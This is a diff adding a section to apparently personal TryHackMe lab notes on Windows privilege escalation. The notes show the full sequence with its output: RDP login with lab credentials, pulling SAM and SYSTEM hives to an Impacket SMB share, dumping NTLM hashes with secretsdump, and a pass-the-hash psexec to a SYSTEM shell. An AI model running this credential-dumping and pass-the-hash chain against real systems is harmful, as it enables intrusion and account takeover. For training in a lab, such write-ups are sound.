@@ -1387,6 +1387,113 @@ End of search: 10 match(es) found.
 
 ```
 
+### ABUSING DANGEROUS PRIVILEGES 
+
+target=10.10.185.198
+
+THMBackup
+CopyMaster555
+
+xfreerdp /u:THMBackup /p:CopyMaster555 /cert:ignore /v:10.10.185.198
+
+
+```
+root@ip-10-10-44-189:~/repo# python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.185.198,49760)
+[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
+[*] User WPRIVESC2\THMBackup authenticated successfully
+[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:af1d089713dff48bc6e43c09b59e0dfe:010100000000000080d566712d06d9016f42eae85c7444b90000000001001000620044004f006f005100610078004b0003001000620044004f006f005100610078004b00020010007600610054004e00410042006f006600040010007600610054004e00410042006f0066000700080080d566712d06d9010600040002000000080030003000000000000000000000000030000092736c35b9e960a92f4bfc8dd14e19a7070e4ef8e03569a5fc0ee5b8584e26040a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00340034002e003100380039000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:public)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:public)
+[*] Closing down connection (10.10.185.198,49760)
+[*] Remaining connections []
+[*] Incoming connection (10.10.185.198,49764)
+[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
+[*] User WPRIVESC2\THMBackup authenticated successfully
+[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:ff5c6dc56b6b5cae8aee35f23067dbb6:0101000000000000803a348f2d06d901ef8df1c9e8f1bb750000000001001000620044004f006f005100610078004b0003001000620044004f006f005100610078004b00020010007600610054004e00410042006f006600040010007600610054004e00410042006f00660007000800803a348f2d06d9010600040002000000080030003000000000000000000000000030000092736c35b9e960a92f4bfc8dd14e19a7070e4ef8e03569a5fc0ee5b8584e26040a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00340034002e003100380039000000000000000000
+[*] Connecting Share(1:public)
+[*] Disconnecting Share(1:public)
+[*] Closing down connection (10.10.185.198,49764)
+[*] Remaining connections []
+```
+
+now go to share folder
+
+```
+root@ip-10-10-44-189:~/repo/share# python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+  Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
+  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+  THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
+  THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
+  [*] Cleaning up...
+
+```
+
+Now trying psexec.py
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::: 
+
+
+root@ip-10-10-44-189:~/repo/share# python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.185.198
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.185.198.....
+[*] Found writable share ADMIN$
+[*] Uploading file zaAmsaQS.exe
+[*] Opening SVCManager on 10.10.185.198.....
+[*] Creating service eVzw on 10.10.185.198.....
+[*] Starting service eVzw.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> type c:\users\administrator\deskstop\flag.txt 
+THM{SEFLAGPRIVILEGE}
+
+```
+
+
+### ABUSING VULNERABLE SOFTWARE 
+
+Target=10.10.236.216
+u: thm-unpriv 
+p: Password321
+
+xfreerdp /u:thm-unpriv /p:Password321 /cert:ignore /v:10.10.236.216
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
